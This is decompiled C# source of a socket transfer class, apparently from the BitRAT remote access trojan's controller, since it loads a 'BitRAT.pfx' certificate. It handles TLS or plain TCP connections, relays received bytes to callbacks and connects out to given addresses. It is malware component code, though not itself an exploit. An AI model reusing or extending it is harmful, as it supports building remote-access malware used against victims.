﻿using System;
using System.IO;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using System.Windows.Forms;

// Token: 0x020000A4 RID: 164
public sealed class GClass1
{
	// Token: 0x060004FE RID: 1278 RVA: 0x00023314 File Offset: 0x00021514
	public GClass1(Socket socket_1, string string_4, bool bool_1)
	{
		this.networkStream_0 = null;
		this.sslStream_0 = null;
		this.bool_0 = bool_1;
		this.string_0 = string_4;
		this.socket_0 = socket_1;
		GClass10 gclass = new GClass10();
		if (this.bool_0)
		{
			this.sslStream_0 = new SslStream(new NetworkStream(this.socket_0, false), false);
			X509Certificate2 serverCertificate = new X509Certificate2(Application.StartupPath + "\\data\\tls\\BitRAT.pfx");
			this.sslStream_0.AuthenticateAsServer(serverCertificate, false, SslProtocols.Tls12, false);
		}
		else
		{
			this.networkStream_0 = new NetworkStream(this.socket_0, true);
		}
		IPEndPoint ipendPoint = (IPEndPoint)this.socket_0.RemoteEndPoint;
		this.string_2 = ipendPoint.Address.ToString();
		this.string_3 = ipendPoint.Port.ToString();
		gclass.byte_0 = new byte[checked(Class135.smethod_0().TransfersRecvBytes - 1 + 1)];
		gclass.socket_0 = socket_1;
		try
		{
			if (this.bool_0)
			{
				this.sslStream_0.BeginRead(gclass.byte_0, 0, Class135.smethod_0().TransfersRecvBytes, new AsyncCallback(this.method_9), gclass);
			}
			else
			{
				this.networkStream_0.BeginRead(gclass.byte_0, 0, Class135.smethod_0().TransfersRecvBytes, new AsyncCallback(this.method_9), gclass);
			}
		}
		catch (Exception ex)
		{
			this.method_7();
		}
	}

	// Token: 0x060004FF RID: 1279 RVA: 0x00005253 File Offset: 0x00003453
	public GClass1()
	{
		this.networkStream_0 = null;
		this.sslStream_0 = null;
		this.socket_0 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
	}

	// Token: 0x06000500 RID: 1280 RVA: 0x0002348C File Offset: 0x0002168C
	public void method_0(GClass1.GDelegate1 gdelegate1_1)
	{
		GClass1.GDelegate1 gdelegate = this.gdelegate1_0;
		GClass1.GDelegate1 gdelegate2;
		do
		{
			gdelegate2 = gdelegate;
			GClass1.GDelegate1 value = (GClass1.GDelegate1)Delegate.Combine(gdelegate2, gdelegate1_1);
			gdelegate = Interlocked.CompareExchange<GClass1.GDelegate1>(ref this.gdelegate1_0, value, gdelegate2);
		}
		while (gdelegate != gdelegate2);
	}

	// Token: 0x06000501 RID: 1281 RVA: 0x000234C4 File Offset: 0x000216C4
	public void method_1(GClass1.GDelegate1 gdelegate1_1)
	{
		GClass1.GDelegate1 gdelegate = this.gdelegate1_0;
		GClass1.GDelegate1 gdelegate2;
		do
		{
			gdelegate2 = gdelegate;
			GClass1.GDelegate1 value = (GClass1.GDelegate1)Delegate.Remove(gdelegate2, gdelegate1_1);
			gdelegate = Interlocked.CompareExchange<GClass1.GDelegate1>(ref this.gdelegate1_0, value, gdelegate2);
		}
		while (gdelegate != gdelegate2);
	}

	// Token: 0x06000502 RID: 1282 RVA: 0x000234FC File Offset: 0x000216FC
	public void method_2(GClass1.GDelegate2 gdelegate2_1)
	{
		GClass1.GDelegate2 gdelegate = this.gdelegate2_0;
		GClass1.GDelegate2 gdelegate2;
		do
		{
			gdelegate2 = gdelegate;
			GClass1.GDelegate2 value = (GClass1.GDelegate2)Delegate.Combine(gdelegate2, gdelegate2_1);
			gdelegate = Interlocked.CompareExchange<GClass1.GDelegate2>(ref this.gdelegate2_0, value, gdelegate2);
		}
		while (gdelegate != gdelegate2);
	}

	// Token: 0x06000503 RID: 1283 RVA: 0x00023534 File Offset: 0x00021734
	public void method_3(GClass1.GDelegate2 gdelegate2_1)
	{
		GClass1.GDelegate2 gdelegate = this.gdelegate2_0;
		GClass1.GDelegate2 gdelegate2;
		do
		{
			gdelegate2 = gdelegate;
			GClass1.GDelegate2 value = (GClass1.GDelegate2)Delegate.Remove(gdelegate2, gdelegate2_1);
			gdelegate = Interlocked.CompareExchange<GClass1.GDelegate2>(ref this.gdelegate2_0, value, gdelegate2);
		}
		while (gdelegate != gdelegate2);
	}

	// Token: 0x06000504 RID: 1284 RVA: 0x0002356C File Offset: 0x0002176C
	public void method_4(GClass1.GDelegate0 gdelegate0_1)
	{
		GClass1.GDelegate0 gdelegate = this.gdelegate0_0;
		GClass1.GDelegate0 gdelegate2;
		do
		{
			gdelegate2 = gdelegate;
			GClass1.GDelegate0 value = (GClass1.GDelegate0)Delegate.Combine(gdelegate2, gdelegate0_1);
			gdelegate = Interlocked.CompareExchange<GClass1.GDelegate0>(ref this.gdelegate0_0, value, gdelegate2);
		}
		while (gdelegate != gdelegate2);
	}

	// Token: 0x06000505 RID: 1285 RVA: 0x000235A4 File Offset: 0x000217A4
	public void method_5(GClass1.GDelegate0 gdelegate0_1)
	{
		GClass1.GDelegate0 gdelegate = this.gdelegate0_0;
		GClass1.GDelegate0 gdelegate2;
		do
		{
			gdelegate2 = gdelegate;
			GClass1.GDelegate0 value = (GClass1.GDelegate0)Delegate.Remove(gdelegate2, gdelegate0_1);
			gdelegate = Interlocked.CompareExchange<GClass1.GDelegate0>(ref this.gdelegate0_0, value, gdelegate2);
		}
		while (gdelegate != gdelegate2);
	}

	// Token: 0x06000506 RID: 1286 RVA: 0x000235DC File Offset: 0x000217DC
	public void method_6(byte[] byte_0)
	{
		try
		{
			GClass10 gclass = new GClass10();
			gclass.byte_0 = new byte[checked(Class135.smethod_0().TransfersRecvBytes - 1 + 1)];
			gclass.socket_0 = this.socket_0;
			gclass.socket_0.LingerState.Enabled = true;
			if (this.bool_0)
			{
				this.sslStream_0.Write(byte_0, 0, byte_0.Length);
			}
			else
			{
				this.networkStream_0.BeginWrite(byte_0, 0, byte_0.Length, new AsyncCallback(this.method_10), gclass);
			}
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x06000507 RID: 1287 RVA: 0x00023680 File Offset: 0x00021880
	public void method_7()
	{
		new GClass10();
		try
		{
			if (this.bool_0)
			{
				this.sslStream_0.Close();
			}
			else
			{
				this.networkStream_0.Close();
			}
		}
		catch (Exception ex)
		{
		}
		try
		{
			this.socket_0.Close();
		}
		catch (Exception ex2)
		{
		}
	}

	// Token: 0x06000508 RID: 1288 RVA: 0x000236FC File Offset: 0x000218FC
	public void method_8(string string_4, int int_0)
	{
		IPEndPoint remoteEP = new IPEndPoint(IPAddress.Parse(string_4), int_0);
		Socket socket = this.socket_0;
		try
		{
			socket.BeginConnect(remoteEP, new AsyncCallback(this.method_12), socket);
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x06000509 RID: 1289 RVA: 0x00023754 File Offset: 0x00021954
	private void method_9(IAsyncResult iasyncResult_0)
	{
		GClass10 gclass = (GClass10)iasyncResult_0.AsyncState;
		try
		{
			int num;
			if (this.bool_0)
			{
				num = this.sslStream_0.EndRead(iasyncResult_0);
			}
			else
			{
				num = this.networkStream_0.EndRead(iasyncResult_0);
			}
			if (num > 0)
			{
				MemoryStream memoryStream = new MemoryStream();
				memoryStream.Write(gclass.byte_0, 0, num);
				GClass1.GDelegate2 gdelegate = this.gdelegate2_0;
				if (gdelegate != null)
				{
					gdelegate(this.string_0, memoryStream.ToArray());
				}
				if (this.bool_0)
				{
					this.sslStream_0.BeginRead(gclass.byte_0, 0, gclass.int_0, new AsyncCallback(this.method_9), gclass);
				}
				else
				{
					this.networkStream_0.BeginRead(gclass.byte_0, 0, gclass.int_0, new AsyncCallback(this.method_9), gclass);
				}
			}
		}
		catch (Exception ex)
		{
			GClass1.GDelegate1 gdelegate2 = this.gdelegate1_0;
			if (gdelegate2 != null)
			{
				gdelegate2(this.string_0, this.string_2, this.string_3, this.bool_0);
			}
		}
	}

	// Token: 0x0600050A RID: 1290 RVA: 0x00005277 File Offset: 0x00003477
	private void method_10(IAsyncResult iasyncResult_0)
	{
		Socket socket = ((GClass10)iasyncResult_0.AsyncState).socket_0;
	}

	// Token: 0x0600050B RID: 1291 RVA: 0x00002F44 File Offset: 0x00001144
	private void method_11(IAsyncResult iasyncResult_0)
	{
	}

	// Token: 0x0600050C RID: 1292 RVA: 0x0002386C File Offset: 0x00021A6C
	private void method_12(IAsyncResult iasyncResult_0)
	{
		this.socket_0 = (Socket)iasyncResult_0.AsyncState;
		this.socket_0.EndConnect(iasyncResult_0);
		GClass1.GDelegate0 gdelegate = this.gdelegate0_0;
		if (gdelegate != null)
		{
			gdelegate("null");
		}
		Socket socket = this.socket_0;
		GClass10 gclass = new GClass10
		{
			socket_0 = socket
		};
		gclass.byte_0 = new byte[checked(Class135.smethod_0().TransfersRecvBytes - 1 + 1)];
		if (this.bool_0)
		{
			this.sslStream_0.BeginRead(gclass.byte_0, 0, gclass.int_0, new AsyncCallback(this.method_9), gclass);
			return;
		}
		this.networkStream_0.BeginRead(gclass.byte_0, 0, gclass.int_0, new AsyncCallback(this.method_9), gclass);
	}

	// Token: 0x0600050D RID: 1293 RVA: 0x00023930 File Offset: 0x00021B30
	public string method_13()
	{
		return this.string_0;
	}

	// Token: 0x040001FE RID: 510
	public bool bool_0;

	// Token: 0x040001FF RID: 511
	public NetworkStream networkStream_0;

	// Token: 0x04000200 RID: 512
	public SslStream sslStream_0;

	// Token: 0x04000201 RID: 513
	public string string_0;

	// Token: 0x04000202 RID: 514
	public Socket socket_0;

	// Token: 0x04000203 RID: 515
	private readonly string string_1;

	// Token: 0x04000204 RID: 516
	public string string_2;

	// Token: 0x04000205 RID: 517
	public string string_3;

	// Token: 0x04000206 RID: 518
	private GClass1.GDelegate1 gdelegate1_0;

	// Token: 0x04000207 RID: 519
	private GClass1.GDelegate2 gdelegate2_0;

	// Token: 0x04000208 RID: 520
	private GClass1.GDelegate0 gdelegate0_0;

	// Token: 0x020000A5 RID: 165
	// (Invoke) Token: 0x06000511 RID: 1297
	public delegate void GDelegate0(string string_0);

	// Token: 0x020000A6 RID: 166
	// (Invoke) Token: 0x06000515 RID: 1301
	public delegate void GDelegate1(string string_0, string string_1, string string_2, bool bool_0);

	// Token: 0x020000A7 RID: 167
	// (Invoke) Token: 0x06000519 RID: 1305
	public delegate void GDelegate2(string string_0, byte[] byte_0);
}
